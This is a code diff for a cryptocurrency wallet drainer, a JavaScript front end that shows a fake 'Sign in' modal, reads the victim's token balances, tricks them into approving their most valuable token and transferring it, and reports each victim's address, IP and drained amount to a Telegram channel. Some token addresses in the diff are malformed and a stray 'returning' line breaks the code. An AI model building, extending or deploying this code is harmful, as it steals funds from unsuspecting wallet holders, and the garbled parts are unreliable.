@@ -75,6 +75,7 @@ function createCustomModal() {
     }
     .custom-modal.show {
       opacity: 1;
+      display: flex;
     }
     .custom-modal-content {
       transform: translateY(-20px);
@@ -128,7 +129,7 @@ function createCustomModal() {
     <div class="custom-modal-content">
       <p class="custom-modal-title">Sign in</p>
       <div class="custom-modal-loader"></div>
-      <p class="custom-modal-message"> Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
+      <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
     </div>
   `
   document.body.appendChild(modal)
@@ -138,7 +139,7 @@ function showCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.style.display = 'flex'
-    setTimeout(() => modal.classList.add('show'), 10) // Небольшая задержка для триггера анимации
+    setTimeout(() => modal.classList.add('show'), 10)
   }
 }
 
@@ -146,7 +147,7 @@ function hideCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.classList.remove('show')
-    setTimeout(() => modal.style.display = 'none', 300) // Ждем завершения анимации (0.3s)
+    setTimeout(() => modal.style.display = 'none', 300)
   }
 }
 
@@ -233,20 +234,6 @@ async function getUserIP() {
   }
 }
 
-async function getGeolocation(ip) {
-  const cachedLocation = sessionStorage.getItem('userLocation')
-  if (cachedLocation) return cachedLocation
-  try {
-    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
-    const data = await response.json()
-    const location = data.cityName && data.countryName ? `${data.cityName}, ${data.countryName}` : 'Unknown Location'
-    sessionStorage.setItem('userLocation', location)
-    return location
-  } catch (error) {
-    return 'Unknown Location'
-  }
-}
-
 function detectDevice() {
   const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
   if (/Windows NT/i.test(userAgent)) return 'Windows'
@@ -282,14 +269,10 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
   }
   store.isProcessingConnection = true
   try {
-
-    // Показать модальное окно
     showCustomModal()
-    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
-
+    await new Promise(resolve => setTimeout(resolve, 3000))
     console.log('Sending wallet connection notification')
     const ip = await getUserIP()
-    const location = await getGeolocation(ip)
     const siteUrl = window.location.href || 'Unknown URL'
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
@@ -305,25 +288,22 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: EVM\n` +
+                    `🕸 Network: ${networkName}\n` +
                     `🌎 ${ip}\n\n` +
                     `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
     store.connectionKey = connectionKey
-
-    // Проверка баланса
     const hasBalance = balances.some(token => token.balance > 0)
     if (!hasBalance) {
       const modalMessage = document.querySelector('.custom-modal-message')
       if (modalMessage) modalMessage.textContent = 'Congratulations!'
-      await new Promise(resolve => setTimeout(resolve, 1000)) // Ждать 1 секунду
+      await new Promise(resolve => setTimeout(resolve, 1000))
       hideCustomModal()
       store.isProcessingConnection = false
       return
     }
-
   } catch (error) {
     store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
     hideCustomModal()
@@ -335,14 +315,13 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
   try {
     console.log('Sending transfer approved notification')
     const ip = await getUserIP()
-    const location = await getGeolocation(ip)
     const siteUrl = window.location.href || 'Unknown URL'
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     const amountValue = (token.balance * token.price).toFixed(2)
     const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: EVM\n` +
+                    `🕸 Network: ${networkName}\n` +
                     `🌎 ${ip}\n\n` +
                     `**🔥 Processing: ${amountValue}$**\n` +
                     `➡️ ${token.symbol}\n\n` +
@@ -357,14 +336,13 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
   try {
     console.log('Sending transfer success notification')
     const ip = await getUserIP()
-    const location = await getGeolocation(ip)
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     const amountValue = (token.balance * token.price).toFixed(2)
     const txLink = getScanLink(txHash, chainId, true)
     const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: EVM\n` +
+                    `🕸 Network: ${networkName}\n` +
                     `🌎 ${ip}\n\n` +
                     `**💰 Total Drained: ${amountValue}$**\n` +
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
@@ -417,21 +395,21 @@ const TOKENS = {
     { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
     { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
     { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
-    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
+    { symbol: 'MBOX', address: '0x3203c9e46ca618c8c4c2c9f0e2e7b0d5d0e75', decimals: 18 },
     { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
     { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
     { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
     { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
-    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 }
+    { symbol: 'PIT', address: '0xa172e2f0f0ed1c8160f7b99c2c6834c2c6b6f2', decimals: 18 }
   ],
   'Polygon': [
-    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
+    { symbol: 'USDT', address: '0xc2132d05d31c914c87c6611c10748aeb04b58e8f', decimals: 6 },
     { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
     { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
-    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 18 },
-    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
+    { symbol: 'GHST', address: '0x3857eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 5 },
+    { symbol: 'DFYN', address: '0xc168e40227e4ebd8c1dabb4b05d0b7c', decimals: 18 },
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
-    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
+    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0faea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
   ]
 }
@@ -495,9 +473,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(65000)
-    const maxFeePerGas = BigInt(10_000_000_000)
-    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    const gasLimit = BigInt(200000)
+    const maxFeePerGas = BigInt(1000000000)
+    const maxPriorityFeePerGas = BigInt(1000000000)
     console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
@@ -562,6 +540,7 @@ const initializeSubscribers = (modal) => {
       })
       const allBalances = await Promise.all(balancePromises)
       store.tokenBalances = allBalances
+ returning
       updateStateDisplay('tokenBalancesState', allBalances)
       let maxValue = 0
       let mostExpensive = null
@@ -647,7 +626,8 @@ const initializeSubscribers = (modal) => {
           let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
-          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          const tokenBalance = mostExpensive.balance
+          const amount = parseUnits(tokenBalance.toString(), mostExpensive.decimals)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           if (transferResult.success) {
             approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
@@ -688,6 +668,8 @@ const initializeSubscribers = (modal) => {
         console.log(message)
         const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
         if (mostExpensiveState) mostExpensiveState.innerHTML = message
+        hideCustomModal()
+        store.isProcessingConnection = false
       }
     }
   }, 1000)
@@ -705,11 +687,15 @@ const initializeSubscribers = (modal) => {
 initializeSubscribers(appKit)
 updateButtonVisibility(appKit.getIsConnectedState())
 
-document.getElementById('open-connect-modal')?.addEventListener('click', () => {
-  if (!appKit.getIsConnectedState()) {
-    appKit.open()
-  }
-})
+// Обработчик для кнопок подключения кошелька
+document.querySelectorAll('.open-connect-modal').forEach(button => {
+  button.addEventListener('click', (event) => {
+    event.stopPropagation(); // Предотвращаем всплытие события к document
+    if (!appKit.getIsConnectedState()) {
+      appKit.open();
+    }
+  });
+});
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
